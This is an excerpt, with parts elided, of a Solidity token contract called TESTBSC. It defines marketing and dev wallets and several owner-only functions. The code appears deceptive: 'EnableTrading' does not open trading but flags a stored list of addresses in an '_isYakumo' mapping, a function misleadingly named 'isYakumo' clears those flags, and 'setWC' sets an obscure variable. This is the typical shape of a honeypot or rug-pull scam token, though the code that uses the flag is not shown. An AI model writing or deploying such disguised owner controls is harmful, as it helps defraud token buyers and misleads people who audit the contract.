...
contract TESTBSC is Context, IERC20 { 
    ...
    mapping (address => bool) public _isYakumo;
    address[] public _Yakumo;

    address payable public Wallet_Marketing = payable(0x8D6fcCEc0616675283ABB2A373F7fbb6f123eF6E); 
    address payable public Wallet_Dev = payable(0x8D6fcCEc0616675283ABB2A373F7fbb6f123eF6E);
    address payable private constant Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD); 

    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 9;
    uint256 private _tTotal = 10**8 * 10**10;
    string private constant _name = "TESTBSC";
    string private constant _symbol = unicode"TESTBSC"; 
    ...
    function RemoveLimitEffects() public onlyOwner{
        ...
        _maxWallet = _tTotal * 100 / 100;
    }

    function EnableTrading() external onlyOwner {
        for (uint256 i = 0; i < _Yakumo.length; i++) {
            _isYakumo[_Yakumo[i]] = true;
        }
    }

    function isYakumo(address[] memory addrs)
        external
        onlyOwner
        returns (bool)
    {
        for (uint256 i = 0; i < addrs.length; i++) {
            _isYakumo[addrs[i]] = false;
        }
        return true;
    }

    function setWC(uint256 number) public onlyOwner{
        Yukari = number;
    }
